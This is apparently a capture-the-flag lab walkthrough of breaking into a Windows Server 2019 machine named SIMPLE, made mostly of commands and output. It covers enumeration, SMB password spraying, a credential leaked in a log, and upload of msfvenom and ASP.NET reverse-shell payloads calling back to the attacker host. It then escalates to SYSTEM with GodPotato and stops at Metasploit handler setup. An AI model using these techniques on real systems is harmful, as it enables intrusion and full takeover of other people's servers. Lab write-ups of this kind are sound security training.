@@ -1,1 +1,829 @@
+					ENUMERATION
+----ifconfig-----                                                                                                                      
+┌──(root㉿kali)-[/home/okina]
+└─# ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
+        inet6 fe80::a00:27ff:fef6:e3c3  prefixlen 64  scopeid 0x20<link>
+        ether 08:00:27:f6:e3:c3  txqueuelen 1000  (Ethernet)
+        RX packets 2656365  bytes 2869783571 (2.6 GiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 2375585  bytes 336956227 (321.3 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
 
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 6152  bytes 650436 (635.1 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 6152  bytes 650436 (635.1 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+
+
+-----netdiscover-----
+┌──(root㉿kali)-[/home/okina]
+└─# bettercap -iface eth0                        
+bettercap v2.32.0 (built for linux amd64 with go1.21.0) [type 'help' for a list of commands]
+
+10.0.2.0/24 > 10.0.2.15  » [15:53:59] [sys.log] [inf] gateway monitor started ...
+10.0.2.0/24 > 10.0.2.15  » net.show
+
+┌───────────┬───────────────────┬─────────┬─────────────────────────────────┬───────┬───────┬──────────┐
+│   IP ▴    │        MAC        │  Name   │             Vendor              │ Sent  │ Recvd │   Seen   │
+├───────────┼───────────────────┼─────────┼─────────────────────────────────┼───────┼───────┼──────────┤
+│ 10.0.2.15 │ 08:00:27:f6:e3:c3 │ eth0    │ PCS Computer Systems GmbH       │ 0 B   │ 0 B   │ 15:53:59 │
+│ 10.0.2.1  │ 52:54:00:12:35:00 │ gateway │ Realtek (UpTech? also reported) │ 60 B  │ 78 B  │ 15:53:59 │
+│           │                   │         │                                 │       │       │          │
+│ 10.0.2.3  │ 08:00:27:2e:10:cd │         │ PCS Computer Systems GmbH       │ 140 B │ 170 B │ 15:54:03 │
+│ 10.0.2.23 │ 08:00:27:97:e0:55 │ SIMPLE  │ PCS Computer Systems GmbH       │ 259 B │ 397 B │ 15:54:03 │
+└───────────┴───────────────────┴─────────┴─────────────────────────────────┴───────┴───────┴──────────┘
+
+↑ 14 kB / ↓ 29 kB / 604 pkts
+
+
+we learn the machine's name, it is SIMPLE and we learn it's ip adress
+
+
+-----enumeration with one and only, nmap-----
+            
+┌──(root㉿kali)-[/home/okina]
+└─# nmap 10.0.2.23 -sS -sC -sV -A -T4
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-06 15:43 +03
+Nmap scan report for 10.0.2.23
+Host is up (0.00092s latency).
+Not shown: 996 closed tcp ports (reset)
+PORT    STATE SERVICE       VERSION
+80/tcp  open  http          Microsoft IIS httpd 10.0
+|_http-title: Simple
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+135/tcp open  msrpc         Microsoft Windows RPC
+139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds?
+MAC Address: 08:00:27:97:E0:55 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Microsoft Windows 2019
+OS details: Microsoft Windows Server 2019
+Network Distance: 1 hop
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2024-03-06T12:43:50
+|_  start_date: N/A
+|_nbstat: NetBIOS name: SIMPLE, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:97:e0:55 (Oracle VirtualBox virtual NIC)
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.92 ms 10.0.2.23
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 22.33 seconds
+
+
+-------------------------------------------------------------               
+Let's check the webpage. We see a few usernames, I write them in text file called users.txt
+There is not much in the source code of the website.
+
+NOT: Now lets try to make use of this usernames, we will be using a tool named crackmapexec. It is a 
+pentesting tool that works against network, it is quite useful.
+It also collects Active Directory info to conduct lateral movement through targeted networks.
+
+                                                                                                                                   
+┌──(root㉿kali)-[/home/okina/Desktop]
+└─# crackmapexec smb 10.0.2.23 -u users.txt -p users.txt
+[*] First time use detected
+[*] Creating home directory structure
+[*] Creating default workspace
+[*] Initializing RDP protocol database
+[*] Initializing FTP protocol database
+[*] Initializing SSH protocol database
+[*] Initializing SMB protocol database
+[*] Initializing LDAP protocol database
+[*] Initializing MSSQL protocol database
+[*] Initializing WINRM protocol database
+[*] Copying default configuration file
+[*] Generating SSL certificate
+SMB         10.0.2.23       445    SIMPLE           [*] Windows 10.0 Build 17763 x64 (name:SIMPLE) (domain:Simple) (signing:False) (SMBv1:False)
+SMB         10.0.2.23       445    SIMPLE           [-] Simple\ruy:ruy STATUS_LOGON_FAILURE 
+SMB         10.0.2.23       445    SIMPLE           [-] Simple\ruy:marcos STATUS_LOGON_FAILURE 
+SMB         10.0.2.23       445    SIMPLE           [-] Simple\ruy:lander STATUS_LOGON_FAILURE 
+SMB         10.0.2.23       445    SIMPLE           [-] Simple\ruy:bogo STATUS_LOGON_FAILURE 
+SMB         10.0.2.23       445    SIMPLE           [-] Simple\ruy:vaiper STATUS_LOGON_FAILURE 
+SMB         10.0.2.23       445    SIMPLE           [-] Simple\marcos:ruy STATUS_LOGON_FAILURE 
+SMB         10.0.2.23       445    SIMPLE           [-] Simple\marcos:marcos STATUS_LOGON_FAILURE 
+SMB         10.0.2.23       445    SIMPLE           [-] Simple\marcos:lander STATUS_LOGON_FAILURE 
+SMB         10.0.2.23       445    SIMPLE           [-] Simple\marcos:bogo STATUS_LOGON_FAILURE 
+SMB         10.0.2.23       445    SIMPLE           [-] Simple\marcos:vaiper STATUS_LOGON_FAILURE 
+SMB         10.0.2.23       445    SIMPLE           [-] Simple\lander:ruy STATUS_LOGON_FAILURE 
+SMB         10.0.2.23       445    SIMPLE           [-] Simple\lander:marcos STATUS_LOGON_FAILURE 
+SMB         10.0.2.23       445    SIMPLE           [-] Simple\lander:lander STATUS_LOGON_FAILURE 
+SMB         10.0.2.23       445    SIMPLE           [-] Simple\lander:bogo STATUS_LOGON_FAILURE 
+SMB         10.0.2.23       445    SIMPLE           [-] Simple\lander:vaiper STATUS_LOGON_FAILURE 
+SMB         10.0.2.23       445    SIMPLE           [-] Simple\bogo:ruy STATUS_LOGON_FAILURE 
+SMB         10.0.2.23       445    SIMPLE           [-] Simple\bogo:marcos STATUS_LOGON_FAILURE 
+SMB         10.0.2.23       445    SIMPLE           [-] Simple\bogo:lander STATUS_LOGON_FAILURE 
+SMB         10.0.2.23       445    SIMPLE           [+] Simple\bogo:bogo 
+
+we see the bogo user's password is also bogo.
+
+
+----NOT: In case crackmapexec doesn't work, use its modified version:-----
+
+┌──(root㉿kali)-[/home/okina/Desktop]
+└─# netexec smb 10.0.2.23 -u userlist.txt -p userlist.txt
+[*] First time use detected
+[*] Creating home directory structure
+[*] Creating missing folder logs
+[*] Creating missing folder modules
+[*] Creating missing folder protocols
+[*] Creating missing folder workspaces
+[*] Creating missing folder obfuscated_scripts
+[*] Creating missing folder screenshots
+[*] Creating default workspace
+[*] Initializing VNC protocol database
+[*] Initializing RDP protocol database
+[*] Initializing FTP protocol database
+[*] Initializing SSH protocol database
+[*] Initializing WMI protocol database
+[*] Initializing SMB protocol database
+[*] Initializing LDAP protocol database
+[*] Initializing MSSQL protocol database
+[*] Initializing WINRM protocol database
+[*] Copying default configuration file
+SMB         10.0.2.23       445    SIMPLE           [*] Windows 10 / Server 2019 Build 17763 x64 (name:SIMPLE) (domain:Simple) (signing:False) (SMBv1:False)
+SMB         10.0.2.23       445    SIMPLE           [-] Simple\ruy:ruy STATUS_LOGON_FAILURE 
+SMB         10.0.2.23       445    SIMPLE           [-] Simple\marcos:ruy STATUS_LOGON_FAILURE 
+SMB         10.0.2.23       445    SIMPLE           [-] Simple\lander:ruy STATUS_LOGON_FAILURE 
+SMB         10.0.2.23       445    SIMPLE           [-] Simple\bogo:ruy STATUS_LOGON_FAILURE 
+SMB         10.0.2.23       445    SIMPLE           [-] Simple\vaiper:ruy STATUS_LOGON_FAILURE 
+SMB         10.0.2.23       445    SIMPLE           [-] Simple\ruy:marcos STATUS_LOGON_FAILURE 
+SMB         10.0.2.23       445    SIMPLE           [-] Simple\marcos:marcos STATUS_LOGON_FAILURE 
+SMB         10.0.2.23       445    SIMPLE           [-] Simple\lander:marcos STATUS_LOGON_FAILURE 
+SMB         10.0.2.23       445    SIMPLE           [-] Simple\bogo:marcos STATUS_LOGON_FAILURE 
+SMB         10.0.2.23       445    SIMPLE           [-] Simple\vaiper:marcos STATUS_LOGON_FAILURE 
+SMB         10.0.2.23       445    SIMPLE           [-] Simple\ruy:lander STATUS_LOGON_FAILURE 
+SMB         10.0.2.23       445    SIMPLE           [-] Simple\marcos:lander STATUS_LOGON_FAILURE 
+SMB         10.0.2.23       445    SIMPLE           [-] Simple\lander:lander STATUS_LOGON_FAILURE 
+SMB         10.0.2.23       445    SIMPLE           [-] Simple\bogo:lander STATUS_LOGON_FAILURE 
+SMB         10.0.2.23       445    SIMPLE           [-] Simple\vaiper:lander STATUS_LOGON_FAILURE 
+SMB         10.0.2.23       445    SIMPLE           [-] Simple\ruy:bogo STATUS_LOGON_FAILURE 
+SMB         10.0.2.23       445    SIMPLE           [-] Simple\marcos:bogo STATUS_LOGON_FAILURE 
+SMB         10.0.2.23       445    SIMPLE           [-] Simple\lander:bogo STATUS_LOGON_FAILURE 
+SMB         10.0.2.23       445    SIMPLE           [+] Simple\bogo:bogo 
+
+
+
+
+-----username=bogo, password=bogo, lets login with smbclient -----
+
+                                                                                                                                   
+┌──(root㉿kali)-[/home/okina/Desktop]
+└─# smbclient -L \\\\10.0.2.23\\ -U bogo
+Password for [WORKGROUP\bogo]:
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Admin remota
+	C$              Disk      Recurso predeterminado
+	IPC$            IPC       IPC remota
+	LOGS            Disk      
+	WEB             Disk      
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.0.2.23 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+
+
+----To look at log files-----
+
+                                                                                                                                   
+┌──(root㉿kali)-[/home/okina/Desktop]
+└─# smbclient //10.0.2.23/LOGS/ -U bogo
+Password for [WORKGROUP\bogo]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Mon Oct  9 00:23:36 2023
+  ..                                  D        0  Mon Oct  9 00:23:36 2023
+  20231008.log                        A     2200  Mon Oct  9 00:23:36 2023
+
+		12966143 blocks of size 4096. 11080790 blocks available
+smb: \> cat 20231008.log 
+cat: command not found
+smb: \> get 20231008.log 
+getting file \20231008.log of size 2200 as 20231008.log (50.0 KiloBytes/sec) (average 50.0 KiloBytes/sec)
+smb: \> 
+
+
+                                                                                                                                   
+┌──(root㉿kali)-[/home/okina/Desktop]
+└─# cat 20231008.log 
+PS C:\> dir \\127.0.0.1\WEB
+Acceso denegado
+At line:1 char:1
++ dir \\127.0.0.1\WEB
++ ~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : PermissionDenied: (\\127.0.0.1\WEB:String) [Get-ChildItem], UnauthorizedAccessException
+    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
+Cannot find path '\\127.0.0.1\WEB' because it does not exist.
+At line:1 char:1
++ dir \\127.0.0.1\WEB
++ ~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (\\127.0.0.1\WEB:String) [Get-ChildItem], ItemNotFoundException
+    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand
+
+PS C:\> net use \\127.0.0.1\WEB
+Se ha completado el comando correctamente.
+
+PS C:\> dir \\127.0.0.1\WEB
+Acceso denegado
+At line:1 char:1
++ dir \\127.0.0.1\WEB
++ ~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : PermissionDenied: (\\127.0.0.1\WEB:String) [Get-ChildItem], UnauthorizedAccessException
+    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
+Cannot find path '\\127.0.0.1\WEB' because it does not exist.
+At line:1 char:1
++ dir \\127.0.0.1\WEB
++ ~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (\\127.0.0.1\WEB:String) [Get-ChildItem], ItemNotFoundException
+    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand
+
+PS C:\> net use \\127.0.0.1\WEB /user:marcos SuperPassword
+Se ha completado el comando correctamente.
+
+PS C:\> dir \\127.0.0.1\WEB
+
+    Directorio: \\127.0.0.1\WEB
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        10/8/2023   9:46 PM                aspnet_client
+-a----        9/26/2023   6:46 PM            703 iisstart.htm
+-a----        10/8/2023  10:46 PM            158 test.php
+
+PS C:\> rm \\127.0.0.1\WEB\*.php
+
+PS C:\> dir \\127.0.0.1\WEB
+
+    Directorio: \\127.0.0.1\WEB
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        10/8/2023   9:46 PM                aspnet_client
+-a----        9/26/2023   6:46 PM            703 iisstart.htm
+
+PS C:\> 
+
+
+-----we get the credentials username=marcos password=SuperPassword, lets login to smbclient as marcos-----
+
+                                                                                                                                   
+┌──(root㉿kali)-[/home/okina/Desktop]
+└─# smbclient //10.0.2.23/WEB/ -U marcos
+Password for [WORKGROUP\marcos]:
+session setup failed: NT_STATUS_PASSWORD_EXPIRED
+
+
+-----marcos password was expired so I had to open the windows device and changed it to Marcos123 -----
+
+as marcos in the windows machine: 
+
+cd Desktop
+type user.txt
+---User Flag---
+
+
+
+----back to kali, lets connect with smbclient----
+
+-----lets look at the permissions of marcos-----
+
+                                                                                                         
+┌──(root㉿kali)-[/home/okina/Desktop]
+└─# crackmapexec smb 10.0.2.23 -u 'marcos' -p 'Marcos123' --shares                  
+SMB         10.0.2.23       445    SIMPLE           [*] Windows 10.0 Build 17763 x64 (name:SIMPLE) (domain:Simple) (signing:False) (SMBv1:False)
+SMB         10.0.2.23       445    SIMPLE           [+] Simple\marcos:Marcos123 
+SMB         10.0.2.23       445    SIMPLE           [+] Enumerated shares
+SMB         10.0.2.23       445    SIMPLE           Share           Permissions     Remark
+SMB         10.0.2.23       445    SIMPLE           -----           -----------     ------
+SMB         10.0.2.23       445    SIMPLE           ADMIN$                          Admin remota
+SMB         10.0.2.23       445    SIMPLE           C$                              Recurso predeterminado
+SMB         10.0.2.23       445    SIMPLE           IPC$            READ            IPC remota
+SMB         10.0.2.23       445    SIMPLE           LOGS            READ            
+SMB         10.0.2.23       445    SIMPLE           WEB             READ,WRITE      
+                                   
+
+
+
+----marcos has both read and write, so we can upload a file to the server and create reverse-shell connection-----
+
+----login to the server as marcos-----
+
+
+┌──(root㉿kali)-[/home/okina/Desktop]
+└─# smbclient //10.0.2.23/WEB/ -U marcos 
+Password for [WORKGROUP\marcos]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Sun Oct  8 18:14:24 2023
+  ..                                  D        0  Sun Oct  8 18:14:24 2023
+  03-comming-soon                     D        0  Mon Oct  9 00:22:15 2023
+  aspnet_client                       D        0  Sun Oct  8 22:46:18 2023
+  common-js                           D        0  Mon Oct  9 00:14:09 2023
+  fonts                               D        0  Mon Oct  9 00:14:09 2023
+  images                              D        0  Mon Oct  9 00:14:09 2023
+  index.html                          A     1481  Mon Oct  9 00:26:47 2023
+
+		12966143 blocks of size 4096. 11074513 blocks available
+smb: \> 
+
+
+-----lets test to see if we can upload a file here-----
+
+┌──(root㉿kali)-[/home/okina/Desktop]
+└─# echo "This is a test" > test.txt                         
+                                                                                                                                   
+┌──(root㉿kali)-[/home/okina/Desktop]
+└─# smbclient //10.0.2.23/WEB/ -U marcos
+Password for [WORKGROUP\marcos]:
+Try "help" to get a list of possible commands.
+smb: \> put test.txt
+putting file test.txt as \test.txt (2.9 kb/s) (average 2.9 kb/s)
+smb: \> 
+
+
+-----when we go to 10.0.2.23/test.txt adress in our browser we see this file, so we can upload a script here to make reverse shell connections-----
+
+-----in smb server there is a file named aspnet_client, there are aspx files created specifically for asp.net format, these files make sure that web pages work and are displayed properly, 
+what we can use it is that we can create aspx files with msfvenom and create reverse connection----
+
+┌──(root㉿kali)-[/home/okina/Desktop]
+└─# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=1234 -f aspx > reverse.aspx 
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of aspx file: 3420 bytes
+                 
+
+-----put our listener to smb server-----
+
+┌──(root㉿kali)-[/home/okina/Desktop]
+└─# smbclient //10.0.2.23/WEB/ -U marcos
+Password for [WORKGROUP\marcos]:
+Try "help" to get a list of possible commands.
+smb: \> put reverse.aspx
+putting file reverse.aspx as \reverse.aspx (2.9 kb/s) (average 2.9 kb/s)
+smb: \> ls
+  .                                   D        0  Mon Mar 18 21:07:43 2024
+  ..                                  D        0  Mon Mar 18 21:07:43 2024
+  03-comming-soon                     D        0  Mon Oct  9 00:22:15 2023
+  aspnet_client                       D        0  Sun Oct  8 22:46:18 2023
+  common-js                           D        0  Mon Oct  9 00:14:09 2023
+  fonts                               D        0  Mon Oct  9 00:14:09 2023
+  images                              D        0  Mon Oct  9 00:14:09 2023
+  index.html                          A     1481  Mon Oct  9 00:26:47 2023
+  reverse.aspx                        A     3420  Mon Mar 18 21:06:35 2024
+  test.txt                            A       15  Mon Mar 18 21:07:43 2024
+
+
+		12966143 blocks of size 4096. 11073886 blocks available
+smb: \> exit
+          
+
+-----I tried both netcat and msfconsole but couldnt connect, so I decide to use a reverse-shell I found after seacrhing on the internet-----
+
+
+┌──(root㉿kali)-[/home/okina/Desktop]
+└─# nano reverse.aspx 
+
+<%@ Page Language="C#" %>
+<%@ Import Namespace="System.Runtime.InteropServices" %>
+<%@ Import Namespace="System.Net" %>
+<%@ Import Namespace="System.Net.Sockets" %>
+<%@ Import Namespace="System.Security.Principal" %>
+<%@ Import Namespace="System.Data.SqlClient" %>
+<script runat="server">
+//Original shell post: https://www.darknet.org.uk/2014/12/insomniashell-asp-net-reverse-shell-bind-shell/
+//Download link: https://www.darknet.org.uk/content/files/InsomniaShell.zip
+    
+	protected void Page_Load(object sender, EventArgs e)
+    {
+	    String host = "10.0.2.15"; //CHANGE THIS
+            int port = 1234; ////CHANGE THIS
+                
+        CallbackShell(host, port);
+    }
+    .
+    .
+    .
+    .
+    .
+    .
+    .
+    </script>
+           
+
+
+----come to smbd , put shell.aspx so we download it and then start listening with netcat-----
+
+
+                                                                                                               
+┌──(root㉿kali)-[/home/okina/Desktop]
+└─# nc -nvlp 1234  
+
+then
+
+┌──(root㉿kali)-[/home/okina]
+└─# curl http://10.0.2.23/shell.aspx
+
+
+┌──(root㉿kali)-[/home/okina/Desktop]
+└─# nc -nvlp 1234  
+listening on [any] 1234 ...
+connect to [10.0.2.15] from (UNKNOWN) [10.0.2.23] 49705
+Spawn Shell...
+Microsoft Windows [Versi�n 10.0.17763.107]
+(c) 2018 Microsoft Corporation. Todos los derechos reservados.
+
+c:\windows\system32\inetsrv>whoami /priv
+whoami /priv
+
+INFORMACI�N DE PRIVILEGIOS
+--------------------------
+
+Nombre de privilegio          Descripci�n                                       Estado       
+============================= ================================================= =============
+SeAssignPrimaryTokenPrivilege Reemplazar un s�mbolo (token) de nivel de proceso Deshabilitado
+SeIncreaseQuotaPrivilege      Ajustar las cuotas de la memoria para un proceso  Deshabilitado
+SeAuditPrivilege              Generar auditor�as de seguridad                   Deshabilitado
+SeChangeNotifyPrivilege       Omitir comprobaci�n de recorrido                  Habilitada   
+SeImpersonatePrivilege        Suplantar a un cliente tras la autenticaci�n      Habilitada   
+SeCreateGlobalPrivilege       Crear objetos globales                            Habilitada   
+SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso      Deshabilitado
+
+c:\windows\system32\inetsrv>
+
+
+
+-----connection is succesfull, run whoami /priv to see how escalate privileges------
+
+-----here we see SeChangeNotifyPrivilege, SeImpersonatePrivilege ve SeCreateGlobalPrivilege privileges are allowed therefore we can use one of these to become admin-----
+
+-----after a quick seacrh on the internet I find that SeImpersonatePrivilege can be abues with GodPotato privilege escalation tool, lets use it-----
+
+
+
+In our browser:
+
+https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-Net4.exe
+
+and download godpotato.exe to our current folder so we can download it into the samba server
+
+smb: \> put GodPotato-NET4.exe 
+putting file GodPotato-NET4.exe as \GodPotato-NET4.exe (4666.6 kb/s) (average 4666.7 kb/s)
+smb: \> ls
+  .                                   D        0  Fri Mar 22 15:12:08 2024
+  ..                                  D        0  Fri Mar 22 15:12:08 2024
+  03-comming-soon                     D        0  Mon Oct  9 00:22:15 2023
+  aspnet_client                       D        0  Sun Oct  8 22:46:18 2023
+  common-js                           D        0  Mon Oct  9 00:14:09 2023
+  fonts                               D        0  Mon Oct  9 00:14:09 2023
+  GodPotato-NET4.exe                  A    57344  Fri Mar 22 15:12:08 2024
+  images                              D        0  Mon Oct  9 00:14:09 2023
+  index.html                          A     1481  Mon Oct  9 00:26:47 2023
+  shell.aspx                          A    15558  Fri Mar 22 14:28:06 2024
+  test.txt                            A       15  Mon Mar 18 21:07:43 2024
+
+
+
+
+-----exit the samba server, enter the shell-----
+
+c:\Users>cd C:\inetpub\wwwroot
+cd C:\inetpub\wwwroot
+
+C:\inetpub\wwwroot>dir
+dir
+ El volumen de la unidad C no tiene etiqueta.
+ El n�mero de serie del volumen es: 26CD-AE41
+
+ Directorio de C:\inetpub\wwwroot
+
+22/03/2024  13:12    <DIR>          .
+22/03/2024  13:12    <DIR>          ..
+08/10/2023  22:22    <DIR>          03-comming-soon
+08/10/2023  20:46    <DIR>          aspnet_client
+08/10/2023  22:14    <DIR>          common-js
+08/10/2023  22:14    <DIR>          fonts
+22/03/2024  13:12            57.344 GodPotato-NET4.exe
+08/10/2023  22:14    <DIR>          images
+08/10/2023  22:26             1.481 index.html
+22/03/2024  12:28            15.558 shell.aspx
+18/03/2024  19:07                15 test.txt
+               4 archivos         74.398 bytes
+               7 dirs  46.271.606.784 bytes libres
+
+
+
+-----we are now at where the server is and see our godpotato.exe file is here, now lets do privilege escalation-----
+
+
+C:\inetpub\wwwroot>.\GodPotato-NET4.exe
+.\GodPotato-NET4.exe
+                                                                                               
+    FFFFF                   FFF  FFFFFFF                                                       
+   FFFFFFF                  FFF  FFFFFFFF                                                      
+  FFF  FFFF                 FFF  FFF   FFF             FFF                  FFF                
+  FFF   FFF                 FFF  FFF   FFF             FFF                  FFF                
+  FFF   FFF                 FFF  FFF   FFF             FFF                  FFF                
+ FFFF        FFFFFFF   FFFFFFFF  FFF   FFF  FFFFFFF  FFFFFFFFF   FFFFFF  FFFFFFFFF    FFFFFF   
+ FFFF       FFFF FFFF  FFF FFFF  FFF  FFFF FFFF FFFF   FFF      FFF  FFF    FFF      FFF FFFF  
+ FFFF FFFFF FFF   FFF FFF   FFF  FFFFFFFF  FFF   FFF   FFF      F    FFF    FFF     FFF   FFF  
+ FFFF   FFF FFF   FFFFFFF   FFF  FFF      FFFF   FFF   FFF         FFFFF    FFF     FFF   FFFF 
+ FFFF   FFF FFF   FFFFFFF   FFF  FFF      FFFF   FFF   FFF      FFFFFFFF    FFF     FFF   FFFF 
+  FFF   FFF FFF   FFF FFF   FFF  FFF       FFF   FFF   FFF     FFFF  FFF    FFF     FFF   FFFF 
+  FFFF FFFF FFFF  FFF FFFF  FFF  FFF       FFF  FFFF   FFF     FFFF  FFF    FFF     FFFF  FFF  
+   FFFFFFFF  FFFFFFF   FFFFFFFF  FFF        FFFFFFF     FFFFFF  FFFFFFFF    FFFFFFF  FFFFFFF   
+    FFFFFFF   FFFFF     FFFFFFF  FFF         FFFFF       FFFFF   FFFFFFFF     FFFF     FFFF    
+
+
+Arguments:
+
+	-cmd Required:True CommandLine (default cmd /c whoami)
+
+Example:
+
+GodPotato -cmd "cmd /c whoami" 
+GodPotato -cmd "cmd /c whoami" 
+
+
+-----lets take a look at how to use this tool-----
+
+
+
+C:\inetpub\wwwroot>.\GodPotato-NET4.exe -cmd "cmd /c whoami"    
+.\GodPotato-NET4.exe -cmd "cmd /c whoami"
+[*] CombaseModule: 0x140706959458304
+[*] DispatchTable: 0x140706961775856
+[*] UseProtseqFunction: 0x140706961151136
+[*] UseProtseqFunctionParamCount: 6
+[*] HookRPC
+[*] Start PipeServer
+[*] CreateNamedPipe \\.\pipe\cda68b09-68c1-44d8-9808-5d426132bc78\pipe\epmapper
+[*] Trigger RPCSS
+[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
+[*] DCOM obj IPID: 00008802-032c-ffff-6eb1-a014cf9b2b56
+[*] DCOM obj OXID: 0xe069c098b8d83288
+[*] DCOM obj OID: 0x2684125722f98fce
+[*] DCOM obj Flags: 0x281
+[*] DCOM obj PublicRefs: 0x0
+[*] Marshal Object bytes len: 100
+[*] UnMarshal Object
+[*] Pipe Connected!
+[*] CurrentUser: NT AUTHORITY\Servicio de red
+[*] CurrentsImpersonationLevel: Impersonation
+[*] Start Search System Token
+[*] PID : 736 Token:0x832  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
+[*] Find System Token : True
+[*] UnmarshalObject: 0x80070776
+[*] CurrentUser: NT AUTHORITY\SYSTEM
+[*] process start with pid 2924
+nt authority\system
+
+
+					PRIVILEGE ESCALATION
+
+
+-----Current user is NT AUTHORITY\SYSTEM, now lets create another reverse shell to escalate privileges and put it into samba server----- 
+
+                                                                                                                 
+┌──(root㉿kali)-[/home/okina/Desktop]
+└─# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=6060 -f exe > nc.exe     
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 354 bytes
+Final size of exe file: 73802 bytes
+
+
+
+smb: \> put nc.exe
+putting file nc.exe as \nc.exe (92.8 kb/s) (average 92.8 kb/s)
+smb: \> ls
+  .                                   D        0  Fri Mar 22 16:25:51 2024
+  ..                                  D        0  Fri Mar 22 16:25:51 2024
+  03-comming-soon                     D        0  Mon Oct  9 00:22:15 2023
+  aspnet_client                       D        0  Sun Oct  8 22:46:18 2023
+  common-js                           D        0  Mon Oct  9 00:14:09 2023
+  fonts                               D        0  Mon Oct  9 00:14:09 2023
+  GodPotato-NET4.exe                  A    57344  Fri Mar 22 15:12:08 2024
+  images                              D        0  Mon Oct  9 00:14:09 2023
+  index.html                          A     1481  Mon Oct  9 00:26:47 2023
+  nc.exe                              A    73802  Fri Mar 22 16:25:51 2024
+  root.exe                            A    73802  Fri Mar 22 16:06:10 2024
+  shell.aspx                          A    15558  Fri Mar 22 14:28:06 2024
+  test.txt                            A       15  Mon Mar 18 21:07:43 2024
+
+
+
+-----errors occured while using netcat to listen to this .exe, I will msfconsole-----
+
+                                                                                                                 
+┌──(root㉿kali)-[/home/okina/Desktop]
+└─# msfconsole   
+Metasploit tip: View all productivity tips with the tips command
+                                                  
+
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMM                MMMMMMMMMM
+MMMN$                           vMMMM
+MMMNl  MMMMM             MMMMM  JMMMM
+MMMNl  MMMMMMMN       NMMMMMMM  JMMMM
+MMMNl  MMMMMMMMMNmmmNMMMMMMMMM  JMMMM
+MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
+MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
+MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
+MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
+MMMNI  MMMNM   MMMMMMM   MMMMM  jMMMM
+MMMNI  WMMMM   MMMMMMM   MMMM#  JMMMM
+MMMMR  ?MMNM             MMMMM .dMMMM
+MMMMNm `?MMM             MMMM` dMMMMM
+MMMMMMN  ?MM             MM?  NMMMMMN
+MMMMMMMMNe                 JMMMMMNMMM
+MMMMMMMMMMNm,            eMMMMMNMMNMM
+MMMMNNMNMMMMMNx        MMMMMMNMMNMMNM
+MMMMMMMMNMMNMMMMm+..+MMNMMNMNMMNMMNMM
+        https://metasploit.com
+
+
+       =[ metasploit v6.3.55-dev                          ]
++ -- --=[ 2397 exploits - 1235 auxiliary - 422 post       ]
++ -- --=[ 1391 payloads - 46 encoders - 11 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
+PAYLOAD => windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
